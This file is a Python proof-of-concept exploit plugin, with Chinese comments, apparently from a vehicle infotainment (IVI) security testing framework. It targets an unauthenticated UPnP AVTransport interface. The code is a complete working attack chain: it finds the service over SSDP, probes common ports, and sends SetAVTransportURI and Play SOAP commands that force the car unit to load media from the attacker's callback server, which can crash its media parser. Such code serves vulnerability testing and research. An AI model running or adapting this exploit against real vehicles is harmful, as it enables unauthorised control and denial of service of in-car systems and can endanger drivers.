"""
PoC Name: UPnP AVTransport Unauthenticated Media Injection DoS
CVE: N/A
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: IVI 系统 UPnP AVTransport SOAP 接口无认证，攻击者可通过 SetAVTransportURI+Play 强制 IVI 播放外部媒体并触发媒体解析器崩溃。完整攻击链包含回调验证
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 12_UPnP_AVTransport_Media_Inject.py <args>
"""
import socket
import sys
import time
import threading
import xml.etree.ElementTree as ET
import requests
from urllib.parse import urljoin, urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin


class UPnPAVTransportMediaInjectPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-012"
    """
    UPnP AVTransport 未认证媒体注入 DoS PoC
    
    漏洞描述:
    车载 IVI 系统（极氪、ZEEKR 等）未对 UPnP AVTransport 接口实施访问控制。
    攻击者可在同一网络段内，通过 SSDP 广播发现 AVTransport 服务，
    然后通过 SOAP 接口未经认证地调用 SetAVTransportURI + Play 命令，
    强制 IVI 系统从外部加载并播放媒体文件。
    
    完整攻击链：协议未授权访问 → 媒体强制加载 → 媒体解析器崩溃（DoS）
    
    与现有 PoC #17 的区别: 本 PoC 实现完整攻击链：
    - 设置媒体 URI 并发送 Play 指令
    - 本地启动临时 HTTP 服务验证目标是否主动回连（证明执行了播放）
    - 更精确地判断漏洞是否可利用
    """
    meta_poc_name = "UPnP AVTransport Media Inject"
    meta_cve_id = "N/A"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"


    SERVICE_TYPE = "urn:schemas-upnp-org:service:AVTransport:1"
    CALLBACK_PORT = 18999  # 本地临时服务监听端口

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-AVTransport-Unauth-Media-Inject"
        self.results["description"] = (
            "UPnP AVTransport SOAP 接口未认证媒体注入 - "
            "通过 SetAVTransportURI+Play 强制加载外部媒体，可触发媒体解析器崩溃"
        )
        self.callback_received = threading.Event()
        self.httpd = None

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需要指定目标 IP 地址（参数: ip 或 target_ip）")
            return False
        return True

    # ──────────── Callback HTTP Server ────────────

    def _start_callback_server(self):
        """启动临时 HTTP 服务，监听目标回连（验证 Play 执行）"""
        event = self.callback_received

        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                event.set()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

            def log_message(self, *args):
                pass  # 静默

        try:
            self.httpd = HTTPServer(("0.0.0.0", self.CALLBACK_PORT), CallbackHandler)
            t = threading.Thread(target=self.httpd.serve_forever)
            t.daemon = True
            t.start()
            self.logger.info(f"[*] 本地回调服务器已启动: 端口 {self.CALLBACK_PORT}")
            return True
        except Exception as e:
            self.logger.warning(f"启动回调服务器失败: {e}，将改用响应码判断")
            return False

    # ──────────── SSDP Discovery ────────────

    def _ssdp_discover(self, timeout=5):
        """SSDP M-SEARCH 发现目标 IP 上的 AVTransport 服务"""
        msg = "\r\n".join([
            "M-SEARCH * HTTP/1.1",
            "HOST: 239.255.255.250:1900",
            'MAN: "ssdp:discover"',
            "MX: 2",
            f"ST: {self.SERVICE_TYPE}",
            "", ""
        ]).encode("utf-8")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/4] 发送 SSDP M-SEARCH 广播，搜寻 AVTransport 服务...")
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start = time.time()
            while time.time() - start < timeout:
                try:
                    data, addr = sock.recvfrom(65507)
                    text = data.decode(errors="ignore")
                    if addr[0] == self.target_ip and "LOCATION:" in text.upper():
                        for line in text.split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                location = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现 LOCATION: {location}")
                                return location
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 发现异常: {e}")
        finally:
            sock.close()

        # 回退：直接尝试常见 UPnP 端口的描述 URL
        self.logger.info("[*] SSDP 广播未收到响应，尝试直接探测常见 UPnP 端口...")
        for port in [49152, 51807, 1900, 8080, 8081]:
            url = f"http://{self.target_ip}:{port}/upnp/desc"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200 and "AVTransport" in r.text:
                    self.logger.info(f"[+] 直接探测发现 UPnP DESC: {url}")
                    return url
            except Exception:
                pass
        return None

    # ──────────── Parse Control URL ────────────

    def _get_control_url(self, location_url):
        """从设备描述 XML 中提取 AVTransport ControlURL"""
        try:
            resp = requests.get(location_url, timeout=5)
            if resp.status_code != 200:
                return None
            ns_d = "{urn:schemas-upnp-org:device-1-0}"
            root = ET.fromstring(resp.content)
            for svc in root.findall(f".//{ns_d}service"):
                stype = svc.find(f"{ns_d}serviceType")
                curl = svc.find(f"{ns_d}controlURL")
                if stype is not None and curl is not None:
                    if self.SERVICE_TYPE in (stype.text or ""):
                        ctrl = (curl.text or "").strip()
                        parsed = urlparse(location_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"
                        full = urljoin(base + "/", ctrl)
                        self.logger.info(f"[+] AVTransport ControlURL: {full}")
                        return full
        except Exception as e:
            self.logger.error(f"解析设备描述 XML 失败: {e}")
        return None

    # ──────────── SOAP Actions ────────────

    def _soap(self, control_url, action, args):
        inner = "".join(f"<{k}>{v}</{k}>" for k, v in args.items())
        body = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:{action} xmlns:u="{self.SERVICE_TYPE}">
{inner}
</u:{action}>
</s:Body>
</s:Envelope>"""
        headers = {
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPAction": f'"{self.SERVICE_TYPE}#{action}"',
        }
        try:
            r = requests.post(control_url, data=body.encode("utf-8"),
                              headers=headers, timeout=8)
            return r.status_code, r.text
        except Exception as e:
            self.logger.debug(f"SOAP {action} 异常: {e}")
            return None, str(e)

    # ──────────── Main Exploit ────────────

    def exploit(self):
        # 获取本机 IP（用于回调 URL）
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"

        # Step 1: 启动回调服务器
        cb_started = self._start_callback_server()
        callback_url = f"http://{local_ip}:{self.CALLBACK_PORT}/poc_probe.mp4"

        # Step 2: 发现 AVTransport
        location = self._ssdp_discover()
        if not location:
            self.logger.warning("[-] 未发现 UPnP AVTransport 服务，目标可能不受影响。")
            self.results["evidence"] = "SSDP 发现失败：未找到 AVTransport 服务"
            if self.httpd:
                self.httpd.shutdown()
            return

        # Step 3: 获取 ControlURL
        self.logger.info("[2/4] 解析设备描述 XML 获取 ControlURL...")
        control_url = self._get_control_url(location)
        if not control_url:
            self.logger.warning("[-] 无法解析 ControlURL，中止检测。")
            self.results["evidence"] = f"LOCATION({location}) 无法解析 AVTransport ControlURL"
            if self.httpd:
                self.httpd.shutdown()
            return

        # Step 4: 发送 SetAVTransportURI
        self.logger.info(f"[3/4] 发送 SetAVTransportURI → {callback_url}")
        status_set, resp_set = self._soap(
            control_url, "SetAVTransportURI",
            {"InstanceID": "0", "CurrentURI": callback_url, "CurrentURIMetaData": ""}
        )
        self.logger.info(f"[*] SetAVTransportURI 响应: HTTP {status_set}")

        if status_set != 200:
            self.logger.info("[-] SetAVTransportURI 被拒绝（已认证或不支持），未检测到漏洞。")
            self.results["evidence"] = f"SetAVTransportURI 返回 {status_set}"
            if self.httpd:
                self.httpd.shutdown()
            return

        # Step 5: 发送 Play
        self.logger.info("[4/4] 发送 Play 指令...")
        status_play, resp_play = self._soap(
            control_url, "Play",
            {"InstanceID": "0", "Speed": "1"}
        )
        self.logger.info(f"[*] Play 响应: HTTP {status_play}")

        # 等待目标回连（最多 8 秒）
        if cb_started:
            self.logger.info("[*] 等待目标回连（最多 8 秒）...")
            got_callback = self.callback_received.wait(timeout=8)
        else:
            got_callback = False

        # 判断漏洞
        if status_set == 200 and status_play == 200:
            self.results["vulnerable"] = True
            evidence = (
                f"UPnP AVTransport 未认证媒体注入确认:\n"
                f"  ControlURL: {control_url}\n"
                f"  SetAVTransportURI: HTTP {status_set} (OK)\n"
                f"  Play: HTTP {status_play} (OK)\n"
                f"  目标回连: {'是（漏洞已完整利用）' if got_callback else '否（但指令已被接受）'}"
            )
            self.results["evidence"] = evidence
            print(f"[!] 【漏洞存在】UPnP AVTransport 未认证媒体注入 - ControlURL: {control_url}")
        elif status_set == 200:
            self.results["vulnerable"] = True
            self.results["evidence"] = (
                f"SetAVTransportURI 被接受 (HTTP 200)，Play 返回 {status_play}。"
                f"\n  ControlURL: {control_url}"
            )
            print(f"[!] 【漏洞存在（部分）】SetAVTransportURI 成功，Play 未成功")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = f"SOAP 操作被拒绝或失败: {status_set}"

        if self.httpd:
            self.httpd.shutdown()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 12_UPnP_AVTransport_Media_Inject.py <args>")
        sys.exit(1)
    plugin = UPnPAVTransportMediaInjectPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
